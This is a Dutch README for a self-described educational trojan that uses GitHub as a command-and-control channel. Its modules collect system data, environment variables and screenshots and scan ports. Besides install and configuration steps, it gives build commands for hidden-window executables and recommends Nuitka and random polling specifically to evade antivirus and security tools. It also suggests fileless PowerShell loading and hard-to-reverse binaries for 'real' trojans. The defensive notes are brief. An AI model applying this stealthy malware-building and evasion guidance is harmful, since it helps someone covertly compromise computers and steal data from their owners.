# Trojan Agent - Educatief Project

##  WAARSCHUWING
Dit project is **ALLEEN** voor educatieve doeleinden binnen de context van Ethical Hacking.
- Test alleen in een virtuele machine of sandbox
- Deel geen echte credentials
- Gebruik dit NOOIT op systemen zonder toestemming

## Projectstructuur

```
├── trojan.py           # Hoofdbestand - de trojan agent
├── requirements.txt    # Python dependencies
├── config/            
│   └── config.json     # Configuratie met modules
├── data/               # Verzamelde resultaten
└── modules/
    ├── system_enum.py  # Systeem informatie module
    ├── portscan.py     # Poort scanner module
    └── screenshot.py   # Screenshot module
```

## Installatie

1. Maak een virtual environment:
```bash
python -m venv venv
venv\Scripts\activate  # Windows
```

2. Installeer dependencies:
```bash
pip install -r requirements.txt
```

3. Configureer GitHub token:
- Maak een Personal Access Token op GitHub.
- Stel de environment variable in op je systeem:
  - **Windows (PowerShell):** `$env:GITHUB_TOKEN="jouw_token_hier"`
  - **Linux/Mac:** `export GITHUB_TOKEN="jouw_token_hier"`
- Of pas `trojan.py` lokaal aan (niet pushen naar GitHub!).

## Configuratie

Pas `config/config.json` aan om te bepalen welke modules worden uitgevoerd:

```json
{
    "modules": [
        {"naam": "system_enum", "params": {"uitgebreid": true}},
        {"naam": "portscan", "params": {"target": "127.0.0.1"}}
    ]
}
```

Lege modules lijst = trojan is "slapend"

## Modules

### 1. System Enumeration (`system_enum`)
Verzamelt systeeminformatie:
- OS en versie
- Netwerk configuratie
- Huidige gebruiker en rechten
- Draaiende processen
- Environment variabelen

### 2. Portscan (`portscan`)
Scant poorten van een target:
- Configureerbare poorten lijst
- Multi-threaded voor snelheid
- Service detectie

### 3. Screenshot (`screenshot`)
Maakt schermafbeeldingen:
- Base64 encoded output
- Instelbare JPEG kwaliteit

## Uitvoeren

```bash
python trojan.py
```

## Compileren naar .exe (Zonder Python installatie)

Als je de trojan wilt draaien op een computer waar **geen Python** op staat, kun je er een `.exe` van maken.

### Optie 1: PyInstaller (Makkelijkst)
1. Installeer PyInstaller:
```bash
pip install pyinstaller
```
2. Maak de `.exe`:
```bash
pyinstaller --onefile --noconsole --hidden-import=github --hidden-import=PIL --hidden-import=mss --hidden-import=psutil --hidden-import=pyautogui trojan.py
```
- `--onefile`: Maakt één enkel bestand.
- `--noconsole`: Zorgt dat er geen zwart venster verschijnt bij het opstarten.
- De `.exe` verschijnt in de map `dist/`.

### Optie 2: Nuitka (Beter voor "Evasion")
Nuitka vertaalt Python naar C++ en compileert het dan. Dit is sneller en wordt minder snel herkend door antivirus.
```bash
pip install nuitka
python -m nuitka --standalone --onefile --windows-disable-console trojan.py
```

## Hoe het werkt

1. Trojan start op en genereert unieke ID
2. Verbindt met GitHub repository
3. Haalt configuratie op (welke modules uitvoeren)
4. Laadt modules dynamisch van GitHub
5. Voert modules uit
6. Stuurt resultaten terug naar data folder
7. Wacht random interval (30-90 sec) en herhaalt

De random polling interval helpt detectie door security tools te voorkomen.

## Ethische Overwegingen

Dit project demonstreert hoe aanvallers:
- C2 (Command & Control) infrastructuur opzetten
- GitHub misbruiken als communicatiekanaal
- Modulaire malware bouwen

Verdediging:
- Monitor ongewoon GitHub API verkeer
- Detecteer onbekende processen die externe connecties maken
- Gebruik endpoint detection tools

## Betere manieren?

Python is geweldig voor ontwikkeling, maar voor "echte" trojans zijn er alternatieven die minder opvallen:
1. **PowerShell:** Staat op elke Windows PC. Je kunt een script direct in het geheugen laden zonder bestanden op de schijf te zetten.
2. **C# / .NET:** Wordt door Windows vertrouwd en compileert naar kleine, snelle bestanden.
3. **Go / Rust:** Compileert naar een "static binary" die heel lastig te reverse-engineeren is.
